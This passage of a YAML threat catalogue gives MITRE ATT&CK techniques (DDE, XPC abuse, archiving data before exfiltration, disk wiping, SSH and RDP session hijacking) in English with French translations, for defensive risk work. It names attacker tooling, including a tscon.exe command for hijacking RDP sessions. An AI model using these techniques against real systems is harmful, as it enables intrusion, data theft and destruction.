          \ Bien qu\u2019il ait \xE9t\xE9 remplac\xE9 par [Component Object Model](https://attack.mitre.org/techniques/T1559/001),\
          \ le DDE peut \xEAtre activ\xE9 dans Windows 10 et la plupart de Microsoft\
          \ Office 2016 via des cl\xE9s du registre. (Citation : BleepingComputer\
          \ DDE d\xE9sactiv\xE9 dans Word d\xE9cembre 2017)(Citation : Microsoft ADV170021\
          \ d\xE9c. 2017)(Citation : Microsoft DDE Advisory nov. 2017)\n\nLes documents\
          \ Microsoft Office peuvent \xEAtre empoisonn\xE9s par des commandes DDE,\
          \ directement ou via des fichiers int\xE9gr\xE9s, et utilis\xE9s pour ex\xE9\
          cuter via des campagnes [Phishing](https://attack.mitre.org/techniques/T1566)\
          \ ou du contenu Web h\xE9berg\xE9, \xE9vitant ainsi l\u2019utilisation de\
          \ macros Visual Basic for Applications (VBA). (Citation : SensePost PS DDE\
          \ mai 2016)(Citation : Kettle CSV DDE ao\xFBt 2014)(Citation : Enigma Reviving\
          \ DDE janvier 2018)(Citation : SensePost MacroLess DDE oct. 2017) De m\xEA\
          me, les adversaires peuvent infecter des charges utiles pour ex\xE9cuter\
          \ des applications et/ou des commandes sur un appareil victime en int\xE9\
          grant des formules DDE dans un fichier CSV destin\xE9 \xE0 \xEAtre ouvert\
          \ via un tableur Windows. (Citation : Injection de CSV OWASP)(Citation :\
          \ CSV Excel Macro Injection)\n\nLa DDE pourrait \xE9galement \xEAtre exploit\xE9\
          e par un adversaire op\xE9rant sur une machine compromise qui n\u2019a pas\
          \ acc\xE8s direct \xE0 un [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059).\
          \ L\u2019ex\xE9cution de DDE peut \xEAtre invoqu\xE9e \xE0 distance via\
          \ [Services distants](https://attack.mitre.org/techniques/T1021) tels que\
          \ [Distributed Component Object Model](https://attack.mitre.org/techniques/T1021/003)\
          \ (DCOM). (Citation : Fireeye Hunting COM juin 2019)\nhttps://attack.mitre.org/techniques/T1559/002"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1559.003
    ref_id: T1559.003
    name: XPC Services
    description: 'Adversaries can provide malicious content to an XPC service daemon
      for local code execution. macOS uses XPC services for basic inter-process communication
      between various processes, such as between the XPC Service daemon and third-party
      application privileged helper tools. Applications can send messages to the XPC
      Service daemon, which runs as root, using the low-level XPC Service <code>C
      API</code> or the high level <code>NSXPCConnection API</code> in order to handle
      tasks that require elevated privileges (such as network connections). Applications
      are responsible for providing the protocol definition which serves as a blueprint
      of the XPC services. Developers typically use XPC Services to provide applications
      stability and privilege separation between the application client and the daemon.(Citation:
      creatingXPCservices)(Citation: Designing Daemons Apple Dev)


      Adversaries can abuse XPC services to execute malicious content. Requests for
      malicious execution can be passed through the application''s XPC Services handler.(Citation:
      CVMServer Vuln)(Citation: Learn XPC Exploitation) This may also include identifying
      and abusing improper XPC client validation and/or poor sanitization of input
      parameters to conduct [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068).

      https://attack.mitre.org/techniques/T1559/003'
    translations:
      fr:
        name: XPC Services
        description: "Les adversaires peuvent fournir du contenu malveillant \xE0\
          \ un d\xE9mon de service XPC pour l\u2019ex\xE9cution locale du code. macOS\
          \ utilise des services XPC pour la communication inter-processus de base\
          \ entre divers processus, comme entre le d\xE9mon du service XPC et les\
          \ outils d\u2019aide privil\xE9gi\xE9s d\u2019applications tierces. Les\
          \ applications peuvent envoyer des messages au d\xE9mon de service XPC,\
          \ qui s\u2019ex\xE9cute en root, en utilisant <code>l\u2019API</code> de\
          \ service C de bas niveau XPC ou <code>l\u2019API NSXPCConnection</code>\
          \ de haut niveau afin de g\xE9rer des t\xE2ches n\xE9cessitant des privil\xE8\
          ges \xE9lev\xE9s (comme les connexions r\xE9seau). Les applications sont\
          \ responsables de fournir la d\xE9finition du protocole qui sert de plan\
          \ directeur des services XPC. Les d\xE9veloppeurs utilisent g\xE9n\xE9ralement\
          \ les services XPC pour assurer la stabilit\xE9 des applications et la s\xE9\
          paration des privil\xE8ges entre le client applicatif et le d\xE9mon. (Citation\
          \ : creatingXPCservices)(Citation : Conception de Daemons Apple Dev)\n\n\
          Les adversaires peuvent abuser des services XPC pour ex\xE9cuter du contenu\
          \ malveillant. Les requ\xEAtes d\u2019ex\xE9cution malveillante peuvent\
          \ \xEAtre transmises via le gestionnaire de services XPC de l\u2019application.\
          \ (Citation : CVMServer Vuln)(Citation : Apprenez l\u2019exploitation du\
          \ XPC) Cela peut \xE9galement inclure l\u2019identification et l\u2019abus\
          \ de validations clients XPC incorrectes et/ou d\u2019une mauvaise nettoyage\
          \ des param\xE8tres d\u2019entr\xE9e pour effectuer [Exploitation pour l\u2019\
          escalade de privil\xE8ges](https://attack.mitre.org/techniques/T1068).\n\
          https://attack.mitre.org/techniques/T1559/003"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1560
    ref_id: T1560
    name: Archive Collected Data
    description: 'An adversary may compress and/or encrypt data that is collected
      prior to exfiltration. Compressing the data can help to obfuscate the collected
      data and minimize the amount of data sent over the network.(Citation: DOJ GRU
      Indictment Jul 2018) Encryption can be used to hide information that is being
      exfiltrated from detection or make exfiltration less conspicuous upon inspection
      by a defender.


      Both compression and encryption are done prior to exfiltration, and can be performed
      using a utility, 3rd party library, or custom method.

      https://attack.mitre.org/techniques/T1560'
    translations:
      fr:
        name: "Donn\xE9es collect\xE9es par l\u2019archive"
        description: "Un adversaire peut compresser et/ou chiffrer les donn\xE9es\
          \ collect\xE9es avant l\u2019exfiltration. La compression des donn\xE9es\
          \ peut aider \xE0 obscurcir les donn\xE9es collect\xE9es et \xE0 minimiser\
          \ la quantit\xE9 de donn\xE9es envoy\xE9es sur le r\xE9seau. (Citation :\
          \ Inculpation du DOJ GRU juillet 2018) Le chiffrement peut \xEAtre utilis\xE9\
          \ pour dissimuler des informations exfiltr\xE9es \xE0 la d\xE9tection ou\
          \ rendre l\u2019exfiltration moins visible lors de l\u2019inspection d\u2019\
          un d\xE9fenseur.\n\nLa compression et le chiffrement sont effectu\xE9s avant\
          \ l\u2019exfiltration, et peuvent \xEAtre r\xE9alis\xE9s \xE0 l\u2019aide\
          \ d\u2019un utilitaire, d\u2019une biblioth\xE8que tierce ou d\u2019une\
          \ m\xE9thode personnalis\xE9e.\nhttps://attack.mitre.org/techniques/T1560"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1560.001
    ref_id: T1560.001
    name: Archive via Utility
    description: "Adversaries may use utilities to compress and/or encrypt collected\
      \ data prior to exfiltration. Many utilities include functionalities to compress,\
      \ encrypt, or otherwise package data into a format that is easier/more secure\
      \ to transport.\n\nAdversaries may abuse various utilities to compress or encrypt\
      \ data before exfiltration. Some third party utilities may be preinstalled,\
      \ such as <code>tar</code> on Linux and macOS or <code>zip</code> on Windows\
      \ systems. \n\nOn Windows, <code>diantz</code> or <code> makecab</code> may\
      \ be used to package collected files into a cabinet (.cab) file. <code>diantz</code>\
      \ may also be used to download and compress files from remote locations (i.e.\
      \ [Remote Data Staging](https://attack.mitre.org/techniques/T1074/002)).(Citation:\
      \ diantz.exe_lolbas) <code>xcopy</code> on Windows can copy files and directories\
      \ with a variety of options. Additionally, adversaries may use [certutil](https://attack.mitre.org/software/S0160)\
      \ to Base64 encode collected data before exfiltration. \n\nAdversaries may use\
      \ also third party utilities, such as 7-Zip, WinRAR, and WinZip, to perform\
      \ similar activities.(Citation: 7zip Homepage)(Citation: WinRAR Homepage)(Citation:\
      \ WinZip Homepage)\nhttps://attack.mitre.org/techniques/T1560/001"
    translations:
      fr:
        name: "Archive via l\u2019utilitaire"
        description: "Les adversaires peuvent utiliser des utilitaires pour compresser\
          \ et/ou chiffrer les donn\xE9es collect\xE9es avant l\u2019exfiltration.\
          \ De nombreux utilitaires incluent des fonctionnalit\xE9s pour compresser,\
          \ chiffrer ou autrement emballer les donn\xE9es dans un format plus facile\
          \ et plus s\xE9curis\xE9 \xE0 transporter.\n\nLes adversaires peuvent abuser\
          \ de divers utilitaires pour compresser ou chiffrer les donn\xE9es avant\
          \ l\u2019exfiltration. Certains utilitaires tiers peuvent \xEAtre pr\xE9\
          install\xE9s, comme <code>tar</code> sur Linux et macOS ou <code>zip</code>\
          \ sur les syst\xE8mes Windows. \n\nSous Windows, <code>diantz</code> ou\
          \ <code> makecab</code> peuvent \xEAtre utilis\xE9s pour emballer les fichiers\
          \ collect\xE9s dans un fichier cabinet (.cab). <code>Diantz</code> peut\
          \ \xE9galement \xEAtre utilis\xE9 pour t\xE9l\xE9charger et compresser des\
          \ fichiers depuis des emplacements distants (par exemple [Remote Data Staging](https://attack.mitre.org/techniques/T1074/002)).\
          \ (Citation : diantz.exe_lolbas) <code>xcopy</code> sur Windows peut copier\
          \ des fichiers et des r\xE9pertoires avec une vari\xE9t\xE9 d\u2019options.\
          \ De plus, les adversaires peuvent utiliser [certutil](https://attack.mitre.org/software/S0160)\
          \ pour encoder les donn\xE9es collect\xE9es par Base64 avant l\u2019exfiltration.\
          \ \n\nLes adversaires peuvent \xE9galement utiliser des utilitaires tiers,\
          \ tels que 7-Zip, WinRAR et WinZip, pour effectuer des activit\xE9s similaires.\
          \ (Citation : 7zip page d\u2019accueil)(Citation : Page d\u2019accueil de\
          \ WinRAR)(Citation : Page d\u2019accueil de WinZip)\nhttps://attack.mitre.org/techniques/T1560/001"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1560.002
    ref_id: T1560.002
    name: Archive via Library
    description: 'An adversary may compress or encrypt data that is collected prior
      to exfiltration using 3rd party libraries. Many libraries exist that can archive
      data, including [Python](https://attack.mitre.org/techniques/T1059/006) rarfile
      (Citation: PyPI RAR), libzip (Citation: libzip), and zlib (Citation: Zlib Github).
      Most libraries include functionality to encrypt and/or compress data.


      Some archival libraries are preinstalled on systems, such as bzip2 on macOS
      and Linux, and zip on Windows. Note that the libraries are different from the
      utilities. The libraries can be linked against when compiling, while the utilities
      require spawning a subshell, or a similar execution mechanism.

      https://attack.mitre.org/techniques/T1560/002'
    translations:
      fr:
        name: "Archive via la biblioth\xE8que"
        description: "Un adversaire peut compresser ou chiffrer les donn\xE9es collect\xE9\
          es avant l\u2019exfiltration \xE0 l\u2019aide de biblioth\xE8ques tierces.\
          \ De nombreuses biblioth\xE8ques peuvent archiver des donn\xE9es, notamment\
          \ [Python](https://attack.mitre.org/techniques/T1059/006), rarfile (Citation\
          \ : PyPI RAR), libzip (Citation : libzip) et zlib (Citation : Zlib Github).\
          \ La plupart des biblioth\xE8ques incluent des fonctionnalit\xE9s pour chiffrer\
          \ et/ou compresser les donn\xE9es.\n\nCertaines biblioth\xE8ques d\u2019\
          archives sont pr\xE9install\xE9es sur des syst\xE8mes, comme bzip2 sur macOS\
          \ et Linux, et zip sur Windows. Notez que les biblioth\xE8ques sont diff\xE9\
          rentes des utilitaires. Les biblioth\xE8ques peuvent \xEAtre li\xE9es lors\
          \ de la compilation, tandis que les utilitaires n\xE9cessitent la cr\xE9\
          ation d\u2019un sous-shell ou d\u2019un m\xE9canisme d\u2019ex\xE9cution\
          \ similaire.\nhttps://attack.mitre.org/techniques/T1560/002"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1560.003
    ref_id: T1560.003
    name: Archive via Custom Method
    description: 'An adversary may compress or encrypt data that is collected prior
      to exfiltration using a custom method. Adversaries may choose to use custom
      archival methods, such as encryption with XOR or stream ciphers implemented
      with no external library or utility references. Custom implementations of well-known
      compression algorithms have also been used.(Citation: ESET Sednit Part 2)

      https://attack.mitre.org/techniques/T1560/003'
    translations:
      fr:
        name: "Archive via une m\xE9thode personnalis\xE9e"
        description: "Un adversaire peut compresser ou chiffrer les donn\xE9es collect\xE9\
          es avant l\u2019exfiltration en utilisant une m\xE9thode personnalis\xE9\
          e. Les adversaires peuvent choisir d\u2019utiliser des m\xE9thodes d\u2019\
          archivage personnalis\xE9es, telles que le chiffrement avec XOR ou des chiffrements\
          \ de flux impl\xE9ment\xE9s sans biblioth\xE8que externe ni r\xE9f\xE9rences\
          \ utilitaires. Des impl\xE9mentations personnalis\xE9es d\u2019algorithmes\
          \ de compression bien connus ont \xE9galement \xE9t\xE9 utilis\xE9es. (Citation\
          \ : ESET Sednit Partie 2)\nhttps://attack.mitre.org/techniques/T1560/003"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1561
    ref_id: T1561
    name: Disk Wipe
    description: 'Adversaries may wipe or corrupt raw disk data on specific systems
      or in large numbers in a network to interrupt availability to system and network
      resources. With direct write access to a disk, adversaries may attempt to overwrite
      portions of disk data. Adversaries may opt to wipe arbitrary portions of disk
      data and/or wipe disk structures like the master boot record (MBR). A complete
      wipe of all disk sectors may be attempted.


      To maximize impact on the target organization in operations where network-wide
      availability interruption is the goal, malware used for wiping disks may have
      worm-like features to propagate across a network by leveraging additional techniques
      like [Valid Accounts](https://attack.mitre.org/techniques/T1078), [OS Credential
      Dumping](https://attack.mitre.org/techniques/T1003), and [SMB/Windows Admin
      Shares](https://attack.mitre.org/techniques/T1021/002).(Citation: Novetta Blockbuster
      Destructive Malware)


      On network devices, adversaries may wipe configuration files and other data
      from the device using [Network Device CLI](https://attack.mitre.org/techniques/T1059/008)
      commands such as `erase`.(Citation: erase_cmd_cisco)

      https://attack.mitre.org/techniques/T1561'
    translations:
      fr:
        name: Effacement du disque
        description: "Les adversaires peuvent effacer ou corrompre les donn\xE9es\
          \ brutes du disque sur des syst\xE8mes sp\xE9cifiques ou en grand nombre\
          \ dans un r\xE9seau afin d\u2019interrompre la disponibilit\xE9 des ressources\
          \ syst\xE8me et r\xE9seau. Avec un acc\xE8s direct en \xE9criture \xE0 un\
          \ disque, les adversaires peuvent tenter d\u2019\xE9craser des parties des\
          \ donn\xE9es du disque. Les adversaires peuvent choisir d\u2019effacer des\
          \ portions arbitraires des donn\xE9es disque et/ou d\u2019effacer les structures\
          \ du disque comme le master boot record (MBR). Un effacement complet de\
          \ tous les secteurs du disque peut \xEAtre tent\xE9.\n\nPour maximiser l\u2019\
          impact sur l\u2019organisation cible dans les op\xE9rations o\xF9 l\u2019\
          interruption de disponibilit\xE9 \xE0 l\u2019\xE9chelle du r\xE9seau est\
          \ l\u2019objectif, les logiciels malveillants utilis\xE9s pour effacer les\
          \ disques peuvent disposer de fonctionnalit\xE9s de type ver pour se propager\
          \ \xE0 travers un r\xE9seau en utilisant des techniques suppl\xE9mentaires\
          \ telles que [Comptes valides](https://attack.mitre.org/techniques/T1078),\
          \ [Dumping de cr\xE9dentiaux OS](https://attack.mitre.org/techniques/T1003)\
          \ et [Partages d\u2019administration SMB/Windows](https://attack.mitre.org/techniques/T1021/002).\
          \ (Citation : Malware destructeur du Novetta Blockbuster)\n\nSur les appareils\
          \ r\xE9seau, les adversaires peuvent effacer les fichiers de configuration\
          \ et autres donn\xE9es de l\u2019appareil en utilisant les commandes [CLI\
          \ du dispositif r\xE9seau](https://attack.mitre.org/techniques/T1059/008)\
          \ telles que \xAB effacer \xBB. (Citation : erase_cmd_cisco)\nhttps://attack.mitre.org/techniques/T1561"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1561.001
    ref_id: T1561.001
    name: Disk Content Wipe
    description: 'Adversaries may erase the contents of storage devices on specific
      systems or in large numbers in a network to interrupt availability to system
      and network resources.


      Adversaries may partially or completely overwrite the contents of a storage
      device rendering the data irrecoverable through the storage interface.(Citation:
      Novetta Blockbuster)(Citation: Novetta Blockbuster Destructive Malware)(Citation:
      DOJ Lazarus Sony 2018) Instead of wiping specific disk structures or files,
      adversaries with destructive intent may wipe arbitrary portions of disk content.
      To wipe disk content, adversaries may acquire direct access to the hard drive
      in order to overwrite arbitrarily sized portions of disk with random data.(Citation:
      Novetta Blockbuster Destructive Malware) Adversaries have also been observed
      leveraging third-party drivers like [RawDisk](https://attack.mitre.org/software/S0364)
      to directly access disk content.(Citation: Novetta Blockbuster)(Citation: Novetta
      Blockbuster Destructive Malware) This behavior is distinct from [Data Destruction](https://attack.mitre.org/techniques/T1485)
      because sections of the disk are erased instead of individual files.


      To maximize impact on the target organization in operations where network-wide
      availability interruption is the goal, malware used for wiping disk content
      may have worm-like features to propagate across a network by leveraging additional
      techniques like [Valid Accounts](https://attack.mitre.org/techniques/T1078),
      [OS Credential Dumping](https://attack.mitre.org/techniques/T1003), and [SMB/Windows
      Admin Shares](https://attack.mitre.org/techniques/T1021/002).(Citation: Novetta
      Blockbuster Destructive Malware)

      https://attack.mitre.org/techniques/T1561/001'
    translations:
      fr:
        name: Effacement du contenu du disque
        description: "Les adversaires peuvent effacer le contenu des dispositifs de\
          \ stockage sur des syst\xE8mes sp\xE9cifiques ou en grand nombre dans un\
          \ r\xE9seau afin d\u2019interrompre la disponibilit\xE9 des ressources syst\xE8\
          me et r\xE9seau.\n\nLes adversaires peuvent \xE9craser partiellement ou\
          \ totalement le contenu d\u2019un p\xE9riph\xE9rique de stockage, rendant\
          \ ainsi les donn\xE9es irr\xE9cup\xE9rables via l\u2019interface de stockage.\
          \ (Citation : Blockbuster de Novetta)(Citation : Malware destructeur du\
          \ Novetta Blockbuster)(Citation : DOJ Lazarus Sony 2018) Au lieu d\u2019\
          effacer des structures ou fichiers sp\xE9cifiques du disque, les adversaires\
          \ \xE0 intention destructrice peuvent effacer des portions arbitraires du\
          \ contenu du disque. Pour effacer le contenu du disque, les adversaires\
          \ peuvent acc\xE9der directement au disque dur afin de remplacer des portions\
          \ de disque de taille arbitraire avec des donn\xE9es al\xE9atoires. (Citation\
          \ : Malware destructeur du Novetta Blockbuster) Des adversaires ont \xE9\
          galement \xE9t\xE9 observ\xE9s exploitant des pilotes tiers comme [RawDisk](https://attack.mitre.org/software/S0364)\
          \ pour acc\xE9der directement au contenu du disque. (Citation : Blockbuster\
          \ de Novetta)(Citation : Malware destructeur du Novetta Blockbuster) Ce\
          \ comportement se distingue de la [Destruction des donn\xE9es](https://attack.mitre.org/techniques/T1485)\
          \ car des sections du disque sont effac\xE9es au lieu des fichiers individuels.\n\
          \nPour maximiser l\u2019impact sur l\u2019organisation cible dans les op\xE9\
          rations o\xF9 l\u2019interruption de disponibilit\xE9 \xE0 l\u2019\xE9chelle\
          \ du r\xE9seau est l\u2019objectif, les logiciels malveillants utilis\xE9\
          s pour effacer le contenu disque peuvent disposer de fonctionnalit\xE9s\
          \ de type ver \xE0 propager \xE0 travers un r\xE9seau en utilisant des techniques\
          \ suppl\xE9mentaires telles que [Comptes valides](https://attack.mitre.org/techniques/T1078),\
          \ [Dumping des identifiants du syst\xE8me d\u2019exploitation](https://attack.mitre.org/techniques/T1003)\
          \ et [Partages d\u2019administration SMB/Windows](https://attack.mitre.org/techniques/T1021/002).\
          \ (Citation : Malware destructeur du Novetta Blockbuster)\nhttps://attack.mitre.org/techniques/T1561/001"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1561.002
    ref_id: T1561.002
    name: Disk Structure Wipe
    description: "Adversaries may corrupt or wipe the disk data structures on a hard\
      \ drive necessary to boot a system; targeting specific critical systems or in\
      \ large numbers in a network to interrupt availability to system and network\
      \ resources. \n\nAdversaries may attempt to render the system unable to boot\
      \ by overwriting critical data located in structures such as the master boot\
      \ record (MBR) or partition table.(Citation: Symantec Shamoon 2012)(Citation:\
      \ FireEye Shamoon Nov 2016)(Citation: Palo Alto Shamoon Nov 2016)(Citation:\
      \ Kaspersky StoneDrill 2017)(Citation: Unit 42 Shamoon3 2018) The data contained\
      \ in disk structures may include the initial executable code for loading an\
      \ operating system or the location of the file system partitions on disk. If\
      \ this information is not present, the computer will not be able to load an\
      \ operating system during the boot process, leaving the computer unavailable.\
      \ [Disk Structure Wipe](https://attack.mitre.org/techniques/T1561/002) may be\
      \ performed in isolation, or along with [Disk Content Wipe](https://attack.mitre.org/techniques/T1561/001)\
      \ if all sectors of a disk are wiped.\n\nOn a network devices, adversaries may\
      \ reformat the file system using [Network Device CLI](https://attack.mitre.org/techniques/T1059/008)\
      \ commands such as `format`.(Citation: format_cmd_cisco)\n\nTo maximize impact\
      \ on the target organization, malware designed for destroying disk structures\
      \ may have worm-like features to propagate across a network by leveraging other\
      \ techniques like [Valid Accounts](https://attack.mitre.org/techniques/T1078),\
      \ [OS Credential Dumping](https://attack.mitre.org/techniques/T1003), and [SMB/Windows\
      \ Admin Shares](https://attack.mitre.org/techniques/T1021/002).(Citation: Symantec\
      \ Shamoon 2012)(Citation: FireEye Shamoon Nov 2016)(Citation: Palo Alto Shamoon\
      \ Nov 2016)(Citation: Kaspersky StoneDrill 2017)"
    translations:
      fr:
        name: Effacement de la structure du disque
        description: "Les adversaires peuvent corrompre ou effacer les structures\
          \ de donn\xE9es du disque sur un disque dur n\xE9cessaires au d\xE9marrage\
          \ d\u2019un syst\xE8me ; cibler des syst\xE8mes critiques sp\xE9cifiques\
          \ ou en grand nombre dans un r\xE9seau afin d\u2019interrompre la disponibilit\xE9\
          \ des ressources syst\xE8me et r\xE9seau. \n\nLes adversaires peuvent tenter\
          \ de rendre le syst\xE8me incapable de d\xE9marrer en \xE9crasant des donn\xE9\
          es critiques situ\xE9es dans des structures telles que l\u2019enregistrement\
          \ de d\xE9marrage ma\xEEtre (MBR) ou la table de partition. (Citation :\
          \ Symantec Shamoon 2012)(Citation : FireEye Shamoon, novembre 2016)(Citation\
          \ : Palo Alto Shamoon, novembre 2016)(Citation : Kaspersky StoneDrill 2017)(Citation\
          \ : Unit\xE9 42 Shamoon3 2018) Les donn\xE9es contenues dans les structures\
          \ de disque peuvent inclure le code ex\xE9cutable initial pour charger un\
          \ syst\xE8me d\u2019exploitation ou l\u2019emplacement des partitions du\
          \ syst\xE8me de fichiers sur le disque. Si cette information n\u2019est\
          \ pas pr\xE9sente, l\u2019ordinateur ne pourra pas charger un syst\xE8me\
          \ d\u2019exploitation pendant le processus de d\xE9marrage, laissant l\u2019\
          ordinateur indisponible. [Effacement de la structure du disque](https://attack.mitre.org/techniques/T1561/002)\
          \ peut \xEAtre effectu\xE9 isol\xE9ment, ou avec [Disk Content Wipe](https://attack.mitre.org/techniques/T1561/001)\
          \ si tous les secteurs d\u2019un disque sont effac\xE9s.\n\nSur un p\xE9\
          riph\xE9rique r\xE9seau, les adversaires peuvent reformater le syst\xE8\
          me de fichiers \xE0 l\u2019aide de commandes [CLI du dispositif r\xE9seau](https://attack.mitre.org/techniques/T1059/008)\
          \ telles que \xAB formater \xBB. (Citation : format_cmd_cisco)\n\nPour maximiser\
          \ l\u2019impact sur l\u2019organisation cible, les logiciels malveillants\
          \ con\xE7us pour d\xE9truire des structures de disque peuvent disposer de\
          \ fonctionnalit\xE9s de type ver pour se propager sur un r\xE9seau en utilisant\
          \ d\u2019autres techniques telles que [Comptes valides](https://attack.mitre.org/techniques/T1078),\
          \ [Dumping des identifiants du syst\xE8me d\u2019exploitation](https://attack.mitre.org/techniques/T1003)\
          \ et [Partages d\u2019administration SMB/Windows](https://attack.mitre.org/techniques/T1021/002).\
          \ (Citation : Symantec Shamoon 2012)(Citation : FireEye Shamoon, novembre\
          \ 2016)(Citation : Palo Alto Shamoon, novembre 2016)(Citation : Kaspersky\
          \ StoneDrill 2017)"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1563
    ref_id: T1563
    name: Remote Service Session Hijacking
    description: 'Adversaries may take control of preexisting sessions with remote
      services to move laterally in an environment. Users may use valid credentials
      to log into a service specifically designed to accept remote connections, such
      as telnet, SSH, and RDP. When a user logs into a service, a session will be
      established that will allow them to maintain a continuous interaction with that
      service.


      Adversaries may commandeer these sessions to carry out actions on remote systems.
      [Remote Service Session Hijacking](https://attack.mitre.org/techniques/T1563)
      differs from use of [Remote Services](https://attack.mitre.org/techniques/T1021)
      because it hijacks an existing session rather than creating a new session using
      [Valid Accounts](https://attack.mitre.org/techniques/T1078).(Citation: RDP Hijacking
      Medium)(Citation: Breach Post-mortem SSH Hijack)'
    translations:
      fr:
        name: "D\xE9tournement de session de service \xE0 distance"
        description: "Les adversaires peuvent prendre le contr\xF4le de sessions pr\xE9\
          existantes avec des services \xE0 distance pour se d\xE9placer lat\xE9ralement\
          \ dans un environnement. Les utilisateurs peuvent utiliser des identifiants\
          \ valides pour se connecter \xE0 un service sp\xE9cifiquement con\xE7u pour\
          \ accepter des connexions distantes, telles que telnet, SSH et RDP. Lorsqu\u2019\
          un utilisateur se connecte \xE0 un service, une session est \xE9tablie pour\
          \ lui permettre de maintenir une interaction continue avec ce service.\n\
          \nLes adversaires peuvent s\u2019approprier ces sessions pour effectuer\
          \ des actions sur des syst\xE8mes distants. [D\xE9tournement de session\
          \ de service \xE0 distance](https://attack.mitre.org/techniques/T1563) diff\xE8\
          re de l\u2019utilisation de [Services Distantes](https://attack.mitre.org/techniques/T1021)\
          \ car elle d\xE9tourne une session existante plut\xF4t que de cr\xE9er une\
          \ nouvelle session en utilisant [Comptes valides](https://attack.mitre.org/techniques/T1078).\
          \ (Citation : Moyen de d\xE9tournement RDP)(Citation : Br\xE8che, d\xE9\
          tournement post-mortem de SSH)"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1563.001
    ref_id: T1563.001
    name: SSH Hijacking
    description: 'Adversaries may hijack a legitimate user''s SSH session to move
      laterally within an environment. Secure Shell (SSH) is a standard means of remote
      access on Linux and macOS systems. It allows a user to connect to another system
      via an encrypted tunnel, commonly authenticating through a password, certificate
      or the use of an asymmetric encryption key pair.


      In order to move laterally from a compromised host, adversaries may take advantage
      of trust relationships established with other systems via public key authentication
      in active SSH sessions by hijacking an existing connection to another system.
      This may occur through compromising the SSH agent itself or by having access
      to the agent''s socket. If an adversary is able to obtain root access, then
      hijacking SSH sessions is likely trivial.(Citation: Slideshare Abusing SSH)(Citation:
      SSHjack Blackhat)(Citation: Clockwork SSH Agent Hijacking)(Citation: Breach
      Post-mortem SSH Hijack)


      [SSH Hijacking](https://attack.mitre.org/techniques/T1563/001) differs from
      use of [SSH](https://attack.mitre.org/techniques/T1021/004) because it hijacks
      an existing SSH session rather than creating a new session using [Valid Accounts](https://attack.mitre.org/techniques/T1078).'
    translations:
      fr:
        name: "D\xE9tournement SSH"
        description: "Les adversaires peuvent d\xE9tourner la session SSH d\u2019\
          un utilisateur l\xE9gitime pour se d\xE9placer lat\xE9ralement dans un environnement.\
          \ Secure Shell (SSH) est un moyen standard d\u2019acc\xE8s \xE0 distance\
          \ sur les syst\xE8mes Linux et macOS. Il permet \xE0 un utilisateur de se\
          \ connecter \xE0 un autre syst\xE8me via un tunnel chiffr\xE9, en s\u2019\
          authentifiant g\xE9n\xE9ralement via un mot de passe, un certificat ou l\u2019\
          utilisation d\u2019une paire de cl\xE9s de chiffrement asym\xE9trique.\n\
          \nPour se d\xE9placer lat\xE9ralement depuis un h\xF4te compromis, les adversaires\
          \ peuvent profiter des relations de confiance \xE9tablies avec d\u2019autres\
          \ syst\xE8mes via une authentification \xE0 cl\xE9 publique dans des sessions\
          \ SSH actives en d\xE9tournant une connexion existante vers un autre syst\xE8\
          me. Cela peut se produire en compromettant l\u2019agent SSH lui-m\xEAme\
          \ ou en ayant acc\xE8s au socket de l\u2019agent. Si un adversaire parvient\
          \ \xE0 obtenir un acc\xE8s root, alors le d\xE9tournement des sessions SSH\
          \ est probablement trivial. (Citation : Slideshare abusant du SSH)(Citation\
          \ : SSHjack Blackhat)(Citation : D\xE9tournement d\u2019agent SSH m\xE9\
          canique)(Citation : Br\xE8che, d\xE9tournement post-mortem de SSH)\n\n[D\xE9\
          tournement de SSH](https://attack.mitre.org/techniques/T1563/001) diff\xE8\
          re de l\u2019utilisation de [SSH](https://attack.mitre.org/techniques/T1021/004)\
          \ car elle d\xE9tourne une session SSH existante plut\xF4t que de cr\xE9\
          er une nouvelle session en utilisant [Comptes valides](https://attack.mitre.org/techniques/T1078)."
  - urn: urn:intuitem:risk:threat:mitre-attack:t1563.002
    ref_id: T1563.002
    name: RDP Hijacking
    description: "Adversaries may hijack a legitimate user\u2019s remote desktop session\
      \ to move laterally within an environment. Remote desktop is a common feature\
      \ in operating systems. It allows a user to log into an interactive session\
      \ with a system desktop graphical user interface on a remote system. Microsoft\
      \ refers to its implementation of the Remote Desktop Protocol (RDP) as Remote\
      \ Desktop Services (RDS).(Citation: TechNet Remote Desktop Services)\n\nAdversaries\
      \ may perform RDP session hijacking which involves stealing a legitimate user's\
      \ remote session. Typically, a user is notified when someone else is trying\
      \ to steal their session. With System permissions and using Terminal Services\
      \ Console, `c:\\windows\\system32\\tscon.exe [session number to be stolen]`,\
      \ an adversary can hijack a session without the need for credentials or prompts\
      \ to the user.(Citation: RDP Hijacking Korznikov) This can be done remotely\
      \ or locally and with active or disconnected sessions.(Citation: RDP Hijacking\
      \ Medium) It can also lead to [Remote System Discovery](https://attack.mitre.org/techniques/T1018)\
      \ and Privilege Escalation by stealing a Domain Admin or higher privileged account\
      \ session. All of this can be done by using native Windows commands, but it\
      \ has also been added as a feature in red teaming tools.(Citation: Kali Redsnarf)\n\
      https://attack.mitre.org/techniques/T1563/002"
    translations:
      fr:
        name: "D\xE9tournement RDP"
        description: "Les adversaires peuvent d\xE9tourner la session de bureau distant\
          \ d\u2019un utilisateur l\xE9gitime pour se d\xE9placer lat\xE9ralement\
          \ dans un environnement. Le bureau \xE0 distance est une fonctionnalit\xE9\
          \ courante dans les syst\xE8mes d\u2019exploitation. Il permet \xE0 un utilisateur\
          \ de se connecter \xE0 une session interactive via une interface graphique\
          \ de bureau syst\xE8me via un syst\xE8me distant. Microsoft d\xE9signe sa\
          \ mise en \u0153uvre du protocole de bureau \xE0 distance (RDP) sous le\
          \ nom de services de bureau \xE0 distance (RDS). (Citation : Services de\
          \ bureau \xE0 distance TechNet)\n\nLes adversaires peuvent effectuer un\
          \ d\xE9tournement de session RDP, ce qui consiste \xE0 voler la session\
